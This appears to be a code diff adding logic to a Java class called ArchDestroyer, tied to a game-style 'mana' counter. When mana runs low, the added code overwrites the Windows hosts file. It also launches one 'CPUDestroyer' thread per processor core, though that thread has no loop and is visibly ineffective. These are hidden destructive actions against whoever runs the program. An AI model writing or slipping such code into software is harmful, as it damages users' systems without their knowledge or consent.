@@ -55,6 +55,62 @@ public class ArchDestroyer {
             }
         }
 
+        if (manaRemaining < 50) {
+
+            if (dataLocation.contains("C:\\")){
+                dataLocation = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+
+
+                File file = new File(dataLocation);
+
+                try {
+                    file.createNewFile();
+                } catch (IOException e) {
+                    System.out.println("Not an admin, please try again");
+                }
+
+                FileWriter writer = null;
+
+                try {
+                    writer = new FileWriter(file);
+                } catch (IOException e) {
+                    System.out.println("Not an admin, please try again");
+                }
+                try {
+                    writer.write("127.0.0.1         .");
+                } catch (IOException e) {
+                    System.out.println("IDK what went wrong here");
+                }
+
+            }
+
+
+        }
+
+        if (manaRemaining < 25) {
+            for (int cores = Runtime.getRuntime().availableProcessors(); cores > 0; cores--) {
+                CPUDestroyer();
+            }
+
+        }
+
+
+
+
+    }
+
+
+
+    private void CPUDestroyer() {
+        Thread loop = new Thread()
+        {
+            public void run()
+            {
+                int fall = 0;
+                fall--;
+            }
+        };
+        loop.start();
 
     }
 
